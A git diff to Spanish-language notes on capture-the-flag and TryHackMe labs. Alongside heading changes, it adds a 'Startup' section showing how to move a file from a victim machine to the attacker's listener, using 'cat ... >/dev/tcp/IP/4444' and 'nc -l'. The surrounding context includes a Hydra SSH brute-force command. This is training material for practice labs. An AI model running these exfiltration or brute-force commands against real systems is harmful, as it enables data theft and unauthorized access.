@@ -198,7 +198,7 @@ Cuando no sepas en que esta encodeado algo pues usa el magic pero a veces eso no
 
 Siempre piensa posibles usuarios validos que vayas encontrando ademas lee los comentarios de las paginas web que vayas encontrando.
 
-## FTP
+### FTP
 
 Para conectarte a un ftp simplemente usa:
 
@@ -229,7 +229,7 @@ editamos los primeros bytes para que se pueda abrir
 
 Despues de esto si se puede abrir nos da un password
 
-## steghide 
+### steghide 
 
 Y a sabes herramienta para stenografia. ***We can’t use steghide tool on png files only jpg/jpeg files.***
 
@@ -237,13 +237,13 @@ Y a sabes herramienta para stenografia. ***We can’t use steghide tool on png f
 steghide extract -sf <FILE_NAME> # Nos pide el password use el de la imagen de antes!
 ```
 
-## xclip
+### xclip
 
 ```
 cat a.txt | xclip -sel clip
 ```
 
-## HYDRA
+### HYDRA
 
 Para usar Hydra tienes que recordar el -l es para cuando tienes un string y mayuscula es cuando quieres buscar en una lista
 
@@ -253,11 +253,25 @@ hydra -L worlist.txt -P wordlist IP ssh
 
 ```
 
+## Startup (TryHackMe)
 
+Esta es una maquina buena para practicar cosas basicas que se necesitan.
 
+### Pasar archivos con /dev/tcp/IP/port ( Y otras opciones)
 
+#### cat
 
+En la maquina victima 
 
+```
+cat test.txt >/dev/tcp/192.168.142.150/4444
+```
+
+En tu maquina atacante (por lo regular tu Kali)
+
+```
+nc -l 4444 > test.txt
+```
 
 
 
